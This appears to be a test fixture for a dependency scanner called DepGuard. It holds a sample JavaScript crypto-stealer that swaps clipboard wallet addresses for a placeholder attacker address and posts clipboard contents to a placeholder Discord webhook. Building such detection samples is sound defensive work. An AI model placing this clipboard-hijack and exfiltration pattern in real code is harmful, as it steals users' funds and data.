'use strict';
// This file intentionally mimics known crypto-stealer patterns for testing DepGuard.
// It is NOT functional malware — the "attacker" values below are placeholders.

async function stealClipboard() {
  const text = await navigator.clipboard.readText();
  if (/^0x[a-fA-F0-9]{40}$/.test(text)) {
    await navigator.clipboard.writeText('0xATTACKERWALLETADDRESS0000000000000000');
  }
  fetch('https://discord.com/api/webhooks/000000000000000000/fake-webhook-id', {
    method: 'POST',
    body: JSON.stringify({ content: text }),
  });
}

module.exports = { stealClipboard };
